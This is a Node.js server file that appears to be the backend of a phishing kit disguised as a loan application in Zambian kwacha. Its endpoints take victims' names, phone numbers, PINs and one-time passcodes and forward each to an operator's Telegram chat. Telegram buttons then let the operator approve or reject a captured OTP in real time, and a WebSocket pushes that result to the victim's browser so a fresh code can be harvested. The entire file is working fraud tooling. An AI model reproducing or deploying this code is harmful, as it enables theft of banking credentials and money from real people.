const express = require('express');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');

// ═══════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.static(__dirname));
app.use(express.json());

const sessions = {};

// ═══════════════════════════════════════════
// WEBSOCKET (user browser ↔ server)
// ═══════════════════════════════════════════
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost:' + PORT);
    const sessionId = url.searchParams.get('session');

    if (sessionId && sessions[sessionId]) {
        sessions[sessionId].ws = ws;
        console.log('✅ User connected:', sessions[sessionId].name);
    }

    ws.on('close', () => {
        if (sessionId && sessions[sessionId]) {
            sessions[sessionId].ws = null;
            console.log('❌ User disconnected:', sessions[sessionId].name);
        }
    });
});

// ═══════════════════════════════════════════
// TELEGRAM REQUEST HELPER
// ═══════════════════════════════════════════
function tgRequest(path, body) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify(body);
        const req = https.request({
            method: 'POST',
            hostname: 'api.telegram.org',
            path: path,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve({ ok: false, raw: data }); }
            });
        });
        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

// ═══════════════════════════════════════════
// SEND TO TELEGRAM
// ═══════════════════════════════════════════
function sendTelegram(text, buttons) {
    const body = {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
    };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    return tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, body)
        .then(res => {
            if (res.ok) console.log('✅ Telegram message sent');
            else console.error('❌ Telegram error:', JSON.stringify(res));
        })
        .catch(err => console.error('❌ Network error:', err.message));
}

// ═══════════════════════════════════════════
// API: Page 1 — Application
// ═══════════════════════════════════════════
app.post('/api/apply', (req, res) => {
    const { name, phone, amount, period } = req.body;
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    const msg = `📋 *NEW LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
📊 *Interest:* K${interest.toLocaleString()}
💵 *Total Repay:* K${total.toLocaleString()}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`;

    sendTelegram(msg);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// API: Page 2 — PIN
// ═══════════════════════════════════════════
app.post('/api/pin', (req, res) => {
    const { name, phone, amount, period, pin } = req.body;

    const msg = `🔐 *PIN VERIFIED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔑 *PIN:* ${pin}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`;

    sendTelegram(msg);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// API: Page 3 — OTP (with admin buttons)
// ═══════════════════════════════════════════
app.post('/api/otp', (req, res) => {
    const { name, phone, amount, period, pin, otp } = req.body;

    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

    sessions[sessionId] = {
        ws: null,
        name, phone, amount, period, pin, otp
    };

    const msg = `📲 *OTP RECEIVED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔑 *PIN:* ${pin}
🔢 *OTP:* ${otp}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━
_Tap button to verify_`;

    const buttons = [[
        { text: '✅ Correct OTP', callback_data: `correct:${sessionId}` },
        { text: '❌ Wrong OTP', callback_data: `wrong:${sessionId}` }
    ]];

    sendTelegram(msg, buttons);
    res.json({ success: true, sessionId });
});

// ═══════════════════════════════════════════
// TELEGRAM POLLING (detects button clicks)
// ═══════════════════════════════════════════
let offset = 0;

async function pollTelegram() {
    try {
        const path = `/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=0`;
        const data = await new Promise((resolve, reject) => {
            const req = https.request({
                method: 'GET',
                hostname: 'api.telegram.org',
                path: path
            }, (res) => {
                let d = '';
                res.on('data', chunk => d += chunk);
                res.on('end', () => {
                    try { resolve(JSON.parse(d)); }
                    catch (e) { resolve({ ok: false }); }
                });
            });
            req.setTimeout(8000, () => { req.destroy(); reject(new Error('timeout')); });
            req.on('error', reject);
            req.end();
        });

        if (data.ok) {
            for (const update of data.result) {
                offset = update.update_id + 1;

                if (update.callback_query) {
                    const cq = update.callback_query;
                    const [action, sessionId] = cq.data.split(':');
                    const session = sessions[sessionId];

                    if (session) {
                        // Acknowledge button press
                        tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                            callback_query_id: cq.id,
                            text: action === 'correct' ? '✅ Approved!' : '❌ Rejected. User notified.'
                        });

                        if (action === 'correct') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'correct' }));
                            }
                            sendTelegram(`✅ *APPROVED*\n👤 ${session.name}\n📱 ${session.phone}\n🕐 ${new Date().toLocaleString('en-ZM')}`);
                            console.log('✅ Approved:', session.name);

                        } else if (action === 'wrong') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'wrong' }));
                            }
                            sendTelegram(`❌ *OTP REJECTED*\n👤 ${session.name}\n📱 ${session.phone}\n🔄 User notified to wait for new OTP\n🕐 ${new Date().toLocaleString('en-ZM')}`);
                            console.log('❌ Rejected:', session.name);
                        }
                    }
                }
            }
        }
    } catch (err) {
        if (err.message !== 'timeout') console.error('Polling error:', err.message);
    }
    setTimeout(pollTelegram, 2000);
}

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 WebSocket: ws://localhost:${PORT}/ws`);
    console.log(`🤖 Telegram polling started`);
    pollTelegram();
});   
